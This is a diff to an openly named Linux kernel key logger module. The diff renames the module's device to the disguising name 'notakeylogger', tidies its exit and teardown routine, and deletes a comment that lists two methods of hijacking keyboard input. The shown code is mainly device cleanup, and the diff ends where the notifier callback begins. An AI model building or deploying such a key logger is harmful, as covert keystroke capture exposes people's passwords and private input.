@@ -9,6 +9,7 @@
 // GENERAL //
 #define DEVICE_NAME "My Key Logger"            // Use this macro for logging
 #define CHRDEV_NAME "My Log Device"            // Use this macro to log the character device
+#define DEV_FILENAME "notakeylogger"           // /dev/DEV_FILENAME
 #define BUFF_SIZE 16                           // Size of the out buffer
 
 // CHAR DEVICE //
@@ -210,7 +211,7 @@ static int __init key_logger_init(void)
     // 6. Create a device and register it with sysfs 
     if (!retVal)
     {
-        device = device_create(cfake_class, NULL, myLD.dev_num, NULL, "notakeylogger" "%d", 1);
+        device = device_create(cfake_class, NULL, myLD.dev_num, NULL, DEV_FILENAME);
 
         if (IS_ERR(device))
         {
@@ -230,38 +231,33 @@ static int __init key_logger_init(void)
 static void __exit key_logger_exit(void)
 {
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
+
+    /////////////////////////////
+    // Unregister the notifier //
+    /////////////////////////////
     unregister_keyboard_notifier(&kl_notif_block);
 
-    // Teardown the character device
+    ///////////////////////////////////
+    // Teardown the character device //
+    ///////////////////////////////////
     HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying device");  // DEBUGGING
-    // device_destroy(class, MKDEV(cfake_major, minor));
     device_destroy(cfake_class, myLD.dev_num);
 
     HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Deleting device");  // DEBUGGING
-    // cdev_del(&dev->cdev);
     cdev_del(myCdev);
 
     HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying class");  // DEBUGGING
-    // class_destroy(cfake_class);
     class_destroy(cfake_class);
 
     HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Unregistering character device");  // DEBUGGING
-    // unregister_chrdev_region(MKDEV(cfake_major, 0), cfake_ndevices);
     unregister_chrdev_region(myLD.dev_num, 1);
 
-    // DONE
+    //////////
+    // DONE //
+    //////////
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
     return;
 }
-
-/*
- *  TWO WAYS OF HIJACKING KEYBOARD INPUT
- *
- *  1. Interrupt Service Routine (ISR) for a keyboard Interrupt Request Line (IRQ)
- *      - Works for older versions of the kernel... KERNEL_VERSION(2,4,9)
- *  2. Register a module with the notification list maintained by the keyboard driver
- *      - Appears to be most common
- */
 
 int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param)
 {
